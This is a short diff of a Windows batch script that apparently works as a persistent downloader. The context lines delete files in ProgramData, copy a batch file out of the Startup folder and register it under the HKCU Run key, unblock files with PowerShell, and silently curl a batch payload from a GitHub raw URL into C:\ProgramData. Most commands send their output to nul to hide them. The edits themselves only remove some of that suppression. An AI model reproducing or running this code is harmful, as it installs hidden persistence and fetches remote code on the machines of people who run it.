@@ -2,8 +2,8 @@
 del "C:\ProgramData\word.bat" >> nul
 del "C:\ProgramData\world.vbs" >> nul
 set errorlevel=errorlevel
-ping -n 1 www.google.com >> nul
-if "%errorlevel%" == "0" goto online >> nul
+ping -n 1 www.google.com
+if "%errorlevel%" == "0" goto online
 copy /Y "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat" "C:\ProgramData\bgin.bat" >> nul
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Bgin" /t REG_SZ /F /D "C:\ProgramData\bgin.bat" >> nul
 timeout 0 >> nul
@@ -35,7 +35,7 @@ powershell.exe Unblock-File -Path "*" >> nul
 powershell.exe Unblock-File -Path "C:\ProgramData\*" >> nul
 exit >> nul
 
-:online >> nul
+:online
 mkdir "C:\ProgramData\PSU" >> nul
 timeout 0 >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/word.txt" -o "C:\ProgramData\word.bat" >> nul
